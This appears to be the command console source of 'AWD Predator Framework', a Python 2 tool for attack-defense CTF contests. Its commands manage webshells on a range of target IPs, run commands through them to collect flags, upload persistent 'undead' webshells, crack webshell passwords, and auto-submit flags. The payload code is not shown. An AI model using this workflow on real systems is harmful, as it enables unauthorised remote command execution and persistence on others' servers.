#! -*- coding:utf-8 -*-
# AWD-Predator-Framowork
# Code by AresX
# Blog:http://ares-x.com

'''
 *
 *                             _ooOoo_
 *                            o8888888o
 *                            88" . "88
 *                            (| -_- |)
 *                            O\  =  /O
 *                         ____/`---'\____
 *                       .'  \\|     |//  `.
 *                      /  \\|||  :  |||//  \
 *                     /  _||||| -:- |||||-  \
 *                     |   | \\\  -  /// |   |
 *                     | \_|  ''\---/''  |   |
 *                     \  .-\__  `-`  ___/-. /
 *                   ___`. .'  /--.--\  `. . __
 *                ."" '<  `.___\_<|>_/___.'  >'"".
 *               | | :  `- \`.;`\ _ /`;.`/ - ` : | |
 *               \  \ `-.   \_ __\ /__ _/   .-` /  /
 *          ======`-.____`-.___\_____/___.-`____.-'======
 *                             `=---='
 *          ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
 *                     佛祖保佑        永无BUG
'''

from cmd import Cmd
from core.flag import *
#from core.shells import *
#from core.ip_list import *
from auxi.command import *
from auxi.upload import *
from auxi.shellcrack import *
import os


class MainConsole(Cmd):
    prompt = "apf> "
    Object = None

    def __init__(self):
        Cmd.__init__(self)

    # 打印装逼信息
    def preloop(self):
        string = """
     ___        ______                                  
    / \ \      / /  _ \                                 
   / _ \ \ /\ / /| | | |                                
  / ___ \ V  V / | |_| |                                
 /_/__ \_\_/\_/  |____/      _                          
 |  _ \ _ __ ___  __| | __ _| |_ ___  _ __              
 | |_) | '__/ _ \/ _` |/ _` | __/ _ \| '__|             
 |  __/| | |  __/ (_| | (_| | || (_) | |                
 |_|___|_|  \___|\__,_|\__,_|\__\___/|_|           _    
 |  ___| __ __ _ _ __ ___   _____      _____  _ __| | __
 | |_ | '__/ _` | '_ ` _ \ / _ \ \ /\ / / _ \| '__| |/ /
 |  _|| | | (_| | | | | | |  __/\ V  V / (_) | |  |   < 
 |_|  |_|  \__,_|_| |_| |_|\___| \_/\_/ \___/|_|  |_|\_\
                                                        
                AWD Predator Framework v1.0                   

              --code by AresX                         
        """
        self.commandHelp = """
Core Commands
=============

Command       Description
-------       -----------
add           add webshell's path and pwd
load          load webshell's path and pwd
save          save webshell's path and pwd
show          show webshell's path and pwd
clear         clear webshell's path and pwd
ip            set targets ip list
showip        show targets ip list
clearip       clear ip list
removeip      remove your own ip from ip list"
getflag       get flag from targets with added webshell
submit        sutmit flag to server
clearflag     clear flags
upload        upload file
crack         crack webshell
exit          exit
showhelp      show core commands
help [x]      show command x's usage and description
                """
        print string
        print self.commandHelp

    load_shell_path_pwd()

    def do_showhelp(self,argv):
        print self.commandHelp

    def help_add(self):
        print "add : usage: add [shell path] [pwd] [type(eval/exec)] [method(get/post)]"
        print "      example: add :8001//a.php x eval get / add :8002//fuckyou.php?pass=xxxx a eval get"

    def do_add(self,argv):
        array = argv.split(' ')
        if len(array) != 4:
            self.Error("Length Not Standard!")
            self.help_add()
            return
        if array[2] not in ['exec','eval']:
            self.Error("Type is wrong! only support eval/exec")
            self.help_add()
            return
        if array[3] not in ['get','post']:
            self.Error("Method is wrong! only support get/post")
            self.help_add()
            return
        if array[2] == 'eval':
            if array[3] == 'get':
                GET_eval_shell_path_pwd(array[0],array[1])
                print "add ok"
                return
            if array[3] == 'post':
                POST_eval_shell_path_pwd(array[0],array[1])
                print "add ok"
                return

        if array[2] == 'exec':
            if array[3] == 'get':
                GET_exec_shell_path_pwd(array[0],array[1])
                print "add ok"
                return
            if array[3] == 'post':
                POST_exec_shell_path_pwd(array[0],array[1])
                print "add ok"
                return

    def help_load(self):
        print "load : usage : load"
        print "       load shell path and pwd"

    def do_load(self,argv):
        try:
            load_shell_path_pwd()
        except:
            print "Load failed,please run save fist"

    def help_save(self):
        print "save : usage : save"
        print "       save shell path pwd"

    def do_save(self,argv):
        save_shell_path_pwd()

    def help_clear(self):
        print "clear : usage : clear"
        print "        clear all webshell's path and pwd"

    def do_clear(self,argv):
        clear_shell_path_pwd()

    def help_show(self):
        print "show : usage : save"
        print "       Show shell path pwd"

    def do_show(self,argv):
        show_sap()

    def help_ip(self):
        print "ip : usage : x.x.a-b.x"
        print "     set ip list , example:ip 192.168.1.1-24 or ip 192.168.2-45.2"

    def do_ip(self,argv):
        array = argv.split('.')
        if len(array) < 4:
            self.Error("Input is wrong")
            self.help_ip()
        ip_list(argv)

    def help_getflag(self):
        print "getflag  : usage : getflag curl xxxx "
        print "           example: getflag curl https:www.baidu.com"
        print "           if you have input this command and it works ,just run getflag!"

    def do_getflag(self,argv):
        global GET_eval_shells_path_pwd,POST_eval_shells_path_pwd,GET_exec_shells_path_pwd,POST_exec_shells_path_pwd
        global command

        if len(ipList) == 0:
            self.Error("Please set the ip list first!")
            self.help_ip()
            return
        if argv == '':
            if command == '':
                print "You should input full command at the first time , usage : getflag curl xxxx"
                return
            else:
                get_flag()
        else:
            command = argv
            set_command(argv)
            get_flag()

    def help_showflag(self):
        print "Show flags what you got"

    def do_showflag(self,argv):
        show_flag()

    def help_clearflag(self):
        print "Clear flags"

    def do_clearflag(self,argv):
        clear_flag()

    def help_submit(self):
        print "submit : usage(the first time) : submit [url] [cookie](please remove ' ') [data](use '?' replace the flag )"
        print "         example: submit http:xxx.xxx.xx/xx/ JSESSIONID=A6F8;route=6cf03 pid=-1&pidName=&flag=?"
        print "         if you have input this command and it works ,just run submit!"

    def do_submit(self,argv):
        if len(flags) == 0:
            self.Error("You don't have any flag,please get flag at first")
            self.help_getflag()
            return
        array = argv.split(' ')
        global url,datas,cookies
        if len(array) == 0 and url != '' and cookies != '' and datas != '':
            submit_flag()
            return
        elif len(array) == 0 and url == '' or cookies == '' or datas == '':
            self.Error(
                "You should input full command at the first time : submit [url] [cookie] [data](use '?' replace the flag )")
            return
        elif len(array) != 0 and len(array) != 3:
            self.Error("Input is wrong ! have you remove ' ' in cookie?")
            self.help_submit()
            return
        elif len(array) == 3:
            if '?' not in array[2]:
                self.Error("Please use ? replace the flag parameter")
                self.Error("example : submit http:xxx.xxx.xx/xx/ JSESSIONID=A6F8;route=6cf03 pid=-1&pidName=&flag=?")
                return
            else:
                if array[0].startswith("http://") or array[0].startswith("https://"):
                    url = array[0],cookies = array[1],datas = array[2]
                    return
                else:
                    self.Error("url is not vaild!")
                    return

    def help_upload(self):
        print "upload : usage: upload <file>(default=shell.php)  #run 'save' at first!"
        print "         upload your file with all eval shells , other file please save in 'auxi/' path"

    def do_upload(self,argv):
        if os.path.getsize('auxi/webshell.txt') == 0:
            self.Error('You have no webshell!Please run save!')
            return
        if argv == '':
            try:
                upload()
                print "upload ok"
            except:
                self.Error('Upload failed')
        else:
            try:
                upload("auxi/" + argv)
                print "Upload ok,Don't forget to add the new webshell!"
            except:
                if not os.path.exists('auxi/' + argv):
                    self.Error('File not exist! Please check')
                    return
                else:
                    self.Error('Upload failed!')
                    return
    def help_cupload(self):
        print "Usage : command   #run save first!"
        print "        upload linux command undead webshell"

    def do_cupload(self,argv):
        cupload()

    def help_exit(self):
        print "exit "

    def do_exit(self,argv):
        print "Bye"
        # del self.object
        return True

    def help_showip(self):
        print "showip : usage: showip"
        print "         show ip list"

    def do_showip(self,argv):
        print_ip()

    def help_removeip(self):
        print "removeip : usage : removeip x.x.x.x"
        print "           remove your own ip from ip list"

    def do_removeip(self,argv):
        array = argv.split('.')
        if len(array) != 4:
            self.Error("Invaild address!")
            return
        remove_ip(argv)

    def help_clearip(self):
        print "Clear ip list"

    def do_clearip(self,argv):
        clear_ip()

    def do_crack(self,argv):
        array=argv.split(' ')
        if  array[0].startswith("http://") or array[0].startswith("https://"):
            crack(argv)
        else:
            self.Error("Url is not vaild !")
            return


    def Error(self,info):
        print info
        return


if __name__ == "__main__":
    a = MainConsole()
    a.cmdloop()


